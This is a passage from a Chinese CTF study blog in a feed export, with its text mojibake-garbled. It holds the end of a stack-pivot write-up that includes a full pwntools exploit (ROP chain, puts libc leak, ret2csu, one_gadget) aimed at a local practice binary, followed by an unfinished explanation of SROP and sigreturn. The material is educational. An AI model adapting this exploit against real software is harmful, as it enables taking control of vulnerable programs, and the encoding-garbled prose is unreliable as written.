src="/../img/2706180-20220206164714236-513385521.png"><br>ï¼ˆç”¨idaä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼‰ åˆå› ä¸ºè¿”å›åœ°å€ä¸€å®šä¼šè¢«å­˜åˆ°æ ˆé‡Œé¢ï¼ˆè¿™æ—¶å€™åœ¨æ‰§è¡Œreadå‡½æ•°ä¹‹å‰ ç”¨gdbçœ‹ä¸€ä¸‹æ ˆ çœ‹çœ‹å“ªä¸ªåœ°å€é‡Œé¢æŒ‡å‘çš„æ˜¯0x4006ed)</p><p> ç„¶åå°±å»å°†readå‡½æ•°è¾“å…¥å†…å®¹çš„åœ°å€ è®¾ç½®æˆé‚£ä¸ªæ ˆçš„åœ°å€å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#callå‡½æ•°ä¸ºè·³è½¬åˆ°æŸåœ°å€å†…æ‰€ä¿å­˜çš„åœ°å€ï¼Œåº”è¯¥ä½¿ç”¨gotè¡¨ä¸­çš„åœ°å€</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#è¿™é‡Œå¤šåŠ 0x40çš„ç›®çš„å°±æ˜¯ä¸ºäº†æ‰§è¡Œputsçš„æ—¶å€™ï¼Œä¸å½±å“ä¹‹å‰çš„gotè¡¨ä¸­çš„æ•°æ®</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#è¿™ä¸€ä¸ª4006E0ä»…ä»…æ˜¯ret2csuæ‰§è¡Œäº†popä¹‹åçš„retçš„è¿”å›çš„åœ°å€ã€‚</span></span><br><span class="line"><span class="comment">#è‡³äºæ€ä¹ˆè¿”å›åˆ°one_gadgetä¸Šçš„ï¼Œæ˜¯å› ä¸ºreadçš„è¿”å›åœ°å€è¢«readè‡ªå·±ç»™æ”¹äº†</span></span><br><span class="line"><span class="comment">#payload2ä¸­çš„ç¬¬ä¸€ä¸ªp64(0)æ˜¯å»å ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ ˆè¿ç§»æœ¬èº«çš„ç‰¹æ€§ï¼Œè¿ç§»åçš„ç¬¬ä¸€ä¸ªå†…å­˜å•å…ƒä¸æ‰§è¡Œ</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #åªè¦æ˜¯å‘é€åœ°å€ å°±è¦ç»è¿‡æ‰“åŒ…ä¹‹åå‘é€</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="6ã€é™„å½•"><a href="#6ã€é™„å½•" class="headerlink" title="6ã€é™„å½•"></a>6ã€é™„å½•</h1><p>æ‰¾leave;retæŒ‡ä»¤åœ°å€ï¼Œåªè¦åœ¨IDAé‡Œçš„ä»£ç æ®µéšä¾¿æ‰¾åˆ°æœ‰leave retå‡ºç°çš„åœ°æ–¹ï¼Œå–leaveçš„åœ°å€å³å¯</p><p> <img src="/../img/2706180-20220118122656393-1019618142.png"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ˆè¿ç§» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºSROPçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/e734c492.html"/>
      <url>/posts/e734c492.html</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªSROPæ˜¯ä¸€ç§æå…¶æœ‰è¶£çš„æ”»å‡»æ–¹å¼ï¼Œå®ƒæ˜¯åˆ©ç”¨ç¨‹åºä»å†…æ ¸å±‚é¢åˆ‡æ¢åˆ°ç”¨æˆ·å±‚é¢æ¢å¤ä¸Šä¸‹æ–‡æ—¶çš„ä¸€ä¸ªæ¼æ´ï¼Œè¯¥æ¼æ´å¯ä»¥è®©æˆ‘ä»¬è‡ªå·±è‡ªè¡Œè®¾ç½®æ‰€æœ‰å¯„å­˜å™¨é‡Œçš„å€¼ã€‚</p><p>åœ¨è¿™ä¹‹å‰æˆ‘ä»¬è¦å…ˆå»äº†è§£ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨ï¼Œå› ä¸ºè¿™ä¸ªæ¼æ´å°±æ˜¯åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€åˆ‡æ¢å‘ç”Ÿçš„ï¼Œæåˆ°ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™é‡Œè¿˜è¦ç®€å•ä»‹ç»ä¸€ä¸‹ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„ç›¸å…³çŸ¥è¯†ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ</h1><h2 id="ç”¨æˆ·æ€ï¼š"><a href="#ç”¨æˆ·æ€ï¼š" class="headerlink" title="ç”¨æˆ·æ€ï¼š"></a>ç”¨æˆ·æ€ï¼š</h2><p>CPUåªèƒ½è®¿é—®å—é™åˆ¶çš„å†…å­˜ï¼Œå¹¶ä¸”ä¸å…è®¸è®¿é—®å¤–å›´è®¾å¤‡ï¼ˆå°±æ˜¯ä¸å…è®¸ç›´æ¥è·Ÿç¡¬ä»¶äº§ç”Ÿå…³ç³»ï¼‰ã€‚æ­¤æ—¶çš„CPUä¸å…è®¸è¢«ç‹¬å ï¼Œè¿™å°±æ„å‘³ç€æ­¤æ—¶çš„CPUå¯ä»¥è¢«åˆ«çš„è¿›ç¨‹æŠ¢å ã€‚</p><h2 id="å†…æ ¸æ€ï¼š"><a href="#å†…æ ¸æ€ï¼š" class="headerlink" title="å†…æ ¸æ€ï¼š"></a>å†…æ ¸æ€ï¼š</h2><p>æ­¤æ—¶çš„CPUå¯ä»¥è®¿é—®ä»»ä½•æ•°æ®ï¼ŒåŒ…æ‹¬å¤–å›´è®¾å¤‡ï¼Œæ¯”å¦‚ç½‘å¡ï¼Œç¡¬ç›˜ç­‰ç­‰ã€‚å¹¶ä¸”æ­¤æ—¶çš„CPUå¯ä»¥ä»ä¸€ä¸ªç¨‹åºåˆ‡æ¢åˆ°å¦å¤–ä¸€ä¸ªç¨‹åºï¼Œå¹¶ä¸”æ²¡æœ‰è¿›ç¨‹èƒ½å¤ŸæŠ¢å CPUï¼Œå› ä¸ºæ­¤æ—¶å†…æ ¸æ€çš„ç‰¹æƒçº§ä¸º0.</p><h1 id="ä¸ºä»€ä¹ˆè¦åŒºåˆ†ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦åŒºåˆ†ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦åŒºåˆ†ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦åŒºåˆ†ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ</h1><p>ç”¨æˆ·æ€å’Œå†…æ ¸æ€è¯´åˆ°åº•å°±æ˜¯CPUæ‰€æ‰§è¡Œçš„æŒ‡ä»¤æƒé™ä¸åŒè€Œåˆ’åˆ†çš„ï¼Œè€Œè¿™æ ·åšçš„ç›®çš„å°±æ˜¯ä¸ºäº†ä¿æŠ¤ç³»ç»Ÿï¼Œåœ¨CPUçš„æ‰€æœ‰æŒ‡ä»¤ä¸­ï¼Œæœ‰ä¸€äº›æŒ‡ä»¤æ˜¯éå¸¸å±é™©çš„ï¼Œå¦‚æœé”™ç”¨ï¼Œå°†å¯¼è‡´æ•´ä¸ªç³»ç»Ÿå´©æºƒã€‚æ¯”å¦‚ï¼šæ¸…å†…å­˜ã€è®¾ç½®æ—¶é’Ÿç­‰ã€‚</p><h1 id="æ€ä¹ˆä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Ÿ"><a href="#æ€ä¹ˆä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Ÿ" class="headerlink" title="æ€ä¹ˆä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Ÿ"></a>æ€ä¹ˆä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Ÿ</h1><p>ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€çš„3ç§æ–¹å¼ï¼š</p><p>a. ç³»ç»Ÿè°ƒç”¨ï¼ˆä¹Ÿæ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥è¦æåˆ°çš„é‡ç‚¹ï¼‰</p><p>è¿™æ˜¯ç”¨æˆ·æ€è¿›ç¨‹ä¸»åŠ¨è¦æ±‚åˆ‡æ¢åˆ°å†…æ ¸æ€çš„ä¸€ç§æ–¹å¼ï¼Œç”¨æˆ·æ€è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ç”³è¯·ä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„æœåŠ¡ç¨‹åºå®Œæˆå·¥ä½œï¼Œæ¯”å¦‚å‰ä¾‹ä¸­fork()å®é™…ä¸Šå°±æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªåˆ›å»ºæ–°è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚è€Œç³»ç»Ÿè°ƒç”¨çš„æœºåˆ¶å…¶æ ¸å¿ƒè¿˜æ˜¯ä½¿ç”¨äº†æ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·ç‰¹åˆ«å¼€æ”¾çš„ä¸€ä¸ªä¸­æ–­æ¥å®ç°ï¼Œä¾‹å¦‚Linuxçš„int 80hä¸­æ–­ã€‚</p><p>b. å¼‚å¸¸</p><p>å½“CPUåœ¨æ‰§è¡Œè¿è¡Œåœ¨ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºæ—¶ï¼Œå‘ç”Ÿäº†æŸäº›äº‹å…ˆä¸å¯çŸ¥çš„å¼‚å¸¸ï¼Œè¿™æ—¶ä¼šè§¦å‘ç”±å½“å‰è¿è¡Œè¿›ç¨‹åˆ‡æ¢åˆ°å¤„ç†æ­¤å¼‚å¸¸çš„å†…æ ¸ç›¸å…³ç¨‹åºä¸­ï¼Œä¹Ÿå°±è½¬åˆ°äº†å†…æ ¸æ€ï¼Œæ¯”å¦‚ç¼ºé¡µå¼‚å¸¸ã€‚</p><p>c. å¤–å›´è®¾å¤‡çš„ä¸­æ–­</p><p>å½“å¤–å›´è®¾å¤‡å®Œæˆç”¨æˆ·è¯·æ±‚çš„æ“ä½œåï¼Œä¼šå‘CPUå‘å‡ºç›¸åº”çš„ä¸­æ–­ä¿¡å·ï¼Œè¿™æ—¶CPUä¼šæš‚åœæ‰§è¡Œä¸‹ä¸€æ¡å³å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤è½¬è€Œå»æ‰§è¡Œä¸ä¸­æ–­ä¿¡å·å¯¹åº”çš„å¤„ç†ç¨‹åºï¼Œå¦‚æœå…ˆå‰æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºï¼Œé‚£ä¹ˆè¿™ä¸ªè½¬æ¢çš„è¿‡ç¨‹è‡ªç„¶ä¹Ÿå°±å‘ç”Ÿäº†ç”±ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢ã€‚æ¯”å¦‚ç¡¬ç›˜è¯»å†™æ“ä½œå®Œæˆï¼Œç³»ç»Ÿä¼šåˆ‡æ¢åˆ°ç¡¬ç›˜è¯»å†™çš„ä¸­æ–­å¤„ç†ç¨‹åºä¸­æ‰§è¡Œåç»­æ“ä½œç­‰ã€‚</p><p>è¿™ä¸ªåšä¸»å¯¹äºç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€æ€»ç»“çš„å¾ˆè¯¦ç»†æ¸…æ¥šï¼Œæˆ‘è¿™é‡Œå°±æ¬è¿ä¸€ä¸‹ã€‚</p><p>åŸæ–‡é“¾æ¥<a href="https://blog.csdn.net/m0_47221702/article/details/119947155">(25æ¡æ¶ˆæ¯) ä»€ä¹ˆæ˜¯ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Ÿ_gloryçš„åšå®¢-CSDNåšå®¢_å†…æ ¸æ€å’Œç”¨æˆ·æ€</a></p><p>è¿™é‡Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨å¾ˆé‡è¦ï¼Œå®ƒçš„å­˜åœ¨æ„å‘³ç€æˆ‘ä»¬æƒ³æ‰§è¡Œä¸€äº›è¾ƒé«˜æƒé™çš„å‡½æ•°å°±éœ€è¦ç»è¿‡ç³»ç»Ÿè°ƒç”¨æ¥å˜æˆå†…æ ¸æ€ä»è€Œå¾—ä»¥å®ç°å‡½æ•°çš„è°ƒç”¨ï¼ˆä¾‹å¦‚read,write,openå‡½æ•°ç­‰ç­‰ï¼‰ã€‚</p><h1 id="ç”¨æˆ·æ€çš„ä¸Šä¸‹æ–‡æ˜¯æ€ä¹ˆè¢«ä¿å­˜çš„ï¼Ÿ"><a href="#ç”¨æˆ·æ€çš„ä¸Šä¸‹æ–‡æ˜¯æ€ä¹ˆè¢«ä¿å­˜çš„ï¼Ÿ" class="headerlink" title="ç”¨æˆ·æ€çš„ä¸Šä¸‹æ–‡æ˜¯æ€ä¹ˆè¢«ä¿å­˜çš„ï¼Ÿ"></a>ç”¨æˆ·æ€çš„ä¸Šä¸‹æ–‡æ˜¯æ€ä¹ˆè¢«ä¿å­˜çš„ï¼Ÿ</h1><p>æˆ‘ä»¬ç°åœ¨è€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼Œæ—¢ç„¶ç°åœ¨ç¨‹åºä»ç”¨æˆ·æ€å˜æˆäº†å†…æ ¸æ€å»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°ï¼Œé‚£ä¹ˆå†è½¬å˜å›ç”¨æˆ·æ€çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨ç”¨æˆ·æ€æ—¶å¯„å­˜å™¨çš„å€¼æ€ä¹ˆåŠï¼Ÿå› ä¸ºåœ¨å†…æ ¸æ‰§è¡Œç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„æ—¶å€™ï¼Œå¯„å­˜å™¨çš„å€¼ä¸€å®šæ˜¯ä¼šå‘ç”Ÿæ”¹å˜çš„ï¼Œå¯å®ƒæ˜¯æ€ä¹ˆä¿å­˜äº†æˆ‘ä»¬å†ç”¨æˆ·æ€çš„ä¸Šä¸‹æ–‡ï¼Ÿ</p><p>ç°åœ¨å½“æˆ‘ä»¬è¦å‡†å¤‡ç³»ç»Ÿè°ƒç”¨äº†ã€‚</p><p><img src="/../img/2706180-20220219203837059-350353018.png"></p><p>å›¾ç‰‡è½¬è‡ª<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki (ctf-wiki.org)</a></p><p>è¿‡ç¨‹â‘ ï¼Œå†…æ ¸ä¼šå‘è¿›ç¨‹å‘é€ä¸€ä¸ªsignalï¼ˆä½ å¯ä»¥æŠŠè¿™ä¸ªç†è§£ä¸ºä¸­æ–­ä¿¡å·ï¼‰ï¼Œæ„æ€æ˜¯æ¥ä¸‹æ¥è¯¥è¿›ç¨‹è¢«æŒ‚èµ·ï¼Œæ­¤åˆ»ç”±å†…æ ¸æ¥æ¥ç®¡ã€‚</p><p>è¿‡ç¨‹â‘¡ï¼Œå†…æ ¸ä¼šä¿å­˜è¯¥è¿›ç¨‹åœ¨ç”¨æˆ·æ€çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”è·³åˆ°å·²ç»æ³¨å†Œå¥½çš„Signal Handlerï¼ˆä¿¡å·å¤„ç†å™¨ï¼‰ï¼Œå½“è¿™ä¸ªSignal Handlerè¿”å›çš„æ—¶å€™ï¼Œå†…æ ¸æ§åˆ¶å»ä¼ é€’äº†ä¸€ä¸²user-space code ï¼ˆç”¨æˆ·å±‚ä»£ç ï¼‰ï¼Œè¿™é‡Œç¿»è¯‘æˆç”¨æˆ·å±‚ä»£ç å¯èƒ½ä¸æ˜¯ç‰¹åˆ«å‡†ç¡®ï¼Œæˆ‘æƒ³è¡¨è¾¾çš„æ„æ€æ˜¯ï¼Œ<strong>è¿™å°±æ˜¯ä¸€ä¸²å®ç°å‡½æ•°åŠŸèƒ½çš„ä»£ç å¹¶ä¸”å¤„äºåœ¨äº†ç”¨æˆ·å±‚</strong>ï¼Œå¹¶ä¸”è¿™éƒ¨åˆ†ä»£ç è¢«ç§°ä½œsignal trampolineã€‚</p><p>è¿‡ç¨‹â‘¢ï¼Œå®ƒæ˜¯åœ¨æ‰§è¡Œsignal trampolineçš„è¿‡ç¨‹ã€‚</p><p>è¿‡ç¨‹â‘£ï¼Œå†…æ ¸å°†æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚</p><p>è¿™æ˜¯å¤§ä½“æµç¨‹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¿å­˜ä¸Šä¸‹æ–‡çš„ç»†èŠ‚ã€‚</p><p><strong>åœ¨ç¬¬äºŒæ­¥çš„æ—¶å€™ï¼Œå†…æ ¸å°±ä¼šå°†æˆ‘ä»¬çš„æ‰€æœ‰å¯„å­˜å™¨å‹æ ˆï¼ŒåŒæ—¶è¿˜ä¼šæŠŠsignalä¿¡æ¯ä»¥åŠrt_sigreturnå‹æ ˆã€‚è¿™ä¸ªret_sigreturnæ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘äº†sigreturnçš„è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼ˆè¿™ä¸ªç³»ç»Ÿè°ƒç”¨æ—¶SROPåˆ©ç”¨çš„æ ¸å¿ƒï¼‰</strong></p><p><img src="/../img/2706180-20220219203845839-1367800712.png"></p><p>å®Œæˆä¸Šè¿°å‹æ ˆä¹‹åï¼Œæ­¤æ—¶çš„æ ˆå¸ƒå±€æ˜¯è¿™æ ·çš„ï¼Œè¿™æ®µå†…å­˜ä¹Ÿè¢«ç§°ä¸ºSignal Frameã€‚</p><p>åˆ°äº†è¿‡ç¨‹â‘£çš„æ—¶å€™ï¼Œæ­¤æ—¶çš„signal trampolineçš„æ‰§è¡Œå·²ç»åˆ°äº†æœ€åçš„retï¼Œæ­¤æ—¶çš„æ ˆé¡¶å°±æ˜¯rt_sigreturn,å› æ­¤åˆæ‰§è¡Œäº†re_sigreturnæ‰€æŒ‡å‘çš„ç³»ç»Ÿè°ƒç”¨sigreturnçš„åœ°å€ï¼Œ<strong>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„ä½œç”¨å°±æ˜¯å»æŠŠæ ˆä¸­çš„æ•°æ®æ¢å¤åˆ°å¯¹åº”å¯„å­˜å™¨é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯ç–¯ç‹‚popã€‚</strong></p><p>éšç€ripçš„å€¼ä¹Ÿè¢«popäº†å›å»ï¼Œæ­¤æ—¶çš„ç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨å·²ç»å®Œå…¨å®Œæˆï¼Œç¨‹åºç»§ç»­è¿è¡Œã€‚</p><h1 id="SROPåŸç†"><a href="#SROPåŸç†" class="headerlink" title="SROPåŸç†"></a>SROPåŸç†</h1><h2 id="ç†è®ºéƒ¨åˆ†"><a href="#ç†è®ºéƒ¨åˆ†" class="headerlink" title="ç†è®ºéƒ¨åˆ†"></a>ç†è®ºéƒ¨åˆ†</h2><p>ä¸Šè¿°è¿‡ç¨‹æ˜¯æ­£å¸¸çš„ç³»ç»Ÿè°ƒç”¨æµç¨‹ï¼Œè€ŒSROPåˆ™æ˜¯åˆ©ç”¨äº†ä¸Šä¸‹æ–‡ä¿å­˜ä¸æ¢å¤çš„æ¼æ´ï¼Œå¦‚æœäº†è§£äº†ä¸Šè¿°çš„å†…å®¹ï¼Œ<strong>å…¶å®å¾ˆæ˜æ˜¾å°±ä¼šå‘ç°æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æŠŠå¯„å­˜å™¨å‹æ ˆä¹‹åæ„é€ çš„Signal Frameä¾ç„¶æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„ï¼Œå¹¶ä¸”æ˜¯ç”¨æˆ·è¿›ç¨‹å¯è¯»å†™çš„ã€‚å¹¶ä¸”æ‰§è¡Œsigreturnçš„æ—¶å€™å¹¶æ²¡æœ‰æ£€æŸ¥å‡†å¤‡æ¢å¤çš„è¿™ä¸ªSignal Frameæ˜¯å¦æ˜¯ä¹‹å‰ä¿å­˜çš„Signal Frame</strong>ã€‚</p><p>è¿™å°±ç»™äº†æˆ‘ä»¬å¯ä¹˜ä¹‹æœºï¼Œæˆ‘ä»¬å¯ä»¥å»ä¼ªé€ ä¸€ä¸ªSignal Frameç„¶åç›´æ¥æ‰§è¡Œsigreturnç³»ç»Ÿè°ƒç”¨ã€‚</p><p>å…ˆçœ‹ä¸‹æ­£å¸¸çš„ç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹ï¼ˆä¸»è¦çœ‹ä¸‹ä¿å­˜ä¸æ¢å¤ä¸Šä¸‹æ–‡ï¼‰ï¼‰<font color=red>ï¼ˆä¸‹é¢ä¸¤ä¸ªå›¾ï¼Œå½“æ—¶åˆ¶ä½œçš„æ—¶å€™ç†è§£çš„ä¸å¤ªå¯¹ï¼Œåº”è¯¥æ˜¯æ‰§è¡Œsignal trampoline,è€Œå¹¶éæ˜¯æ‰§è¡Œsignal handlerï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹</font></p><p><img src="/../img/2706180-20220219203856864-84934145.png"></p><p>æ¥ä¸‹æ¥çœ‹çœ‹å¦‚æœæˆ‘ä»¬ç³»ç»Ÿè°ƒç”¨çš„æ˜¯sigreturn**(è¿™ä¸ªsigreturnå¹¶<u>ä¸æ˜¯æ‰§è¡Œäº†å…¶ä»–ç³»ç»Ÿè°ƒç”¨è¢«åŠ¨æ‰§è¡Œçš„sigreturn</u>ï¼Œè€Œæ˜¯<u>æˆ‘ä»¬ä¸»åŠ¨ç³»ç»Ÿ</u>è°ƒç”¨çš„å°±æ˜¯sigreturn)**</p><p><img src="/../img/2706180-20220219203904231-699432548.png"></p><h2 id="å®è·µéƒ¨åˆ†"><a href="#å®è·µéƒ¨åˆ†" class="headerlink" title="å®è·µéƒ¨åˆ†"></a>å®è·µéƒ¨åˆ†</h2><p>å½“ç„¶ä¸Šé¢éƒ½æ˜¯ç†è®ºçŸ¥è¯†ï¼Œæˆ‘ä»¬åŠ¨æ€è°ƒè¯•çœ‹ä¸€ä¸‹æ˜¯ä¸æ˜¯è¿™æ ·ã€‚</p><p><img src="/../img/2706180-20220219203910793-1182638386.png"></p><p><img src="/../img/2706180-20220219203917580-709368108.png"></p><p>è¿™æ˜¯<strong>å‡†å¤‡ç³»ç»Ÿè°ƒç”¨sigreturnä¹‹å‰çš„å¯„å­˜å™¨çš„å€¼</strong>ï¼ˆæ­¤æ—¶çš„å¯„å­˜å™¨æ˜¯å°†è¦è¢«ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼‰å’Œæ ˆå¸ƒå±€ï¼ˆ<strong>æ­¤æ—¶æ ˆçš„å¸ƒå±€å°±æ˜¯ä¸ºäº†æˆ‘ä»¬å‡†ç¡®æ§åˆ¶æ¯ä¸€ä¸ªå¯„å­˜å™¨çš„å€¼ï¼‰</strong></p><p><img src="/../img/2706180-20220219203926667-105079808.png"></p><p>æ­¤æ—¶æ˜¯ç³»ç»Ÿè°ƒç”¨sigturnä¹‹åçš„å¯„å­˜å™¨ï¼Œå¯ä»¥çœ‹è§å‚ç…§æ„é€ çš„Signal Frameï¼Œç²¾å‡†çš„æ”¹å˜äº†æ¯ä¸€ä¸ªå¯„å­˜å™¨çš„å€¼ï¼ˆæ­¤æ—¶execveçš„ç³»ç»Ÿè°ƒç”¨å·ä»¥åŠå‚æ•°å…¨éƒ¨è¢«å¸ƒç½®å¥½äº†ï¼Œæ­¤æ—¶åªè¦æ‰§è¡Œäº†syscallå°±å¯ä»¥è·å–shellï¼‰</p><h2 id="æå‡ºä¸€ä¸ªçŒœæƒ³"><a href="#æå‡ºä¸€ä¸ªçŒœæƒ³" class="headerlink" title="æå‡ºä¸€ä¸ªçŒœæƒ³"></a>æå‡ºä¸€ä¸ªçŒœæƒ³</h2><p>åŒæ—¶æˆ‘ä»¬åˆšæ‰ç†è®ºä¸ŠçŒœæƒ³çš„æ˜¯ä¸»åŠ¨æ‰§è¡Œäº†sigreturnç„¶åæ‰§è¡Œexecveæ˜¯ä¸ä¼šå†è®©rt_sigreturnè§¦å‘äº†ï¼ˆä¹Ÿå°±æ˜¯ä¸ä¼šå†å›åˆ°æ‰§è¡Œsigreturnä¹‹å‰äº†ï¼‰ï¼Œ<strong>é‚£åè¿‡æ¥å°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬æ‰§è¡Œçš„ä¸æ˜¯execveï¼Œé‚£æœ€årt_sigreturnè¿˜æ˜¯ä¼šè§¦å‘ï¼Œä¹Ÿå°±æ˜¯å³ä½¿ä¸»åŠ¨æ‰§è¡Œäº†sigreturnæ§åˆ¶äº†æˆ‘ä»¬æƒ³è¦çš„å‚æ•°ï¼Œä½†æ˜¯ç³»ç»Ÿè°ƒç”¨ç»“æŸä¹‹åï¼Œå¯„å­˜å™¨é‡Œè¿˜æ˜¯æˆ‘ä»¬æœ€å¼€å§‹ä¿å­˜çš„å‚æ•°ï¼Œè€Œéä¸»åŠ¨æ‰§è¡Œsigreturnå¸ƒç½®çš„å‚æ•°ã€‚</strong></p><h2 id="éªŒè¯çŒœæƒ³"><a href="#éªŒè¯çŒœæƒ³" class="headerlink" title="éªŒè¯çŒœæƒ³"></a>éªŒè¯çŒœæƒ³</h2><p>ä¸ºäº†éªŒè¯ä¸Šé¢çš„çŒœæƒ³ï¼Œæˆ‘ä»¬å†ç”¨sigreturnæ¥å¸ƒç½®å‚æ•°çš„æ—¶å€™ï¼Œå¸ƒç½®writeï¼ˆ1,â€™&#x2F;bin&#x2F;shâ€™,7)è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶ä¸”ä½¿å…¶è¿”å›åœ°å€ä¸ºä¸€ä¸ª_term_procå‡½æ•°ï¼ˆè¿”å›åˆ°ä¸€ä¸ªç©ºå‡½æ•°ï¼Œä¸å¯¹æœ¬æ¬¡å®éªŒäº§ç”Ÿä»»ä½•å½±å“ï¼‰</p><p>è¿™ä¸ªæ˜¯å°†è¦å› ä¸ºæ‰§è¡Œsigreturnç³»ç»Ÿè°ƒç”¨è€Œè¢«ä¿å­˜çš„å¯„å­˜å™¨</p><p><img 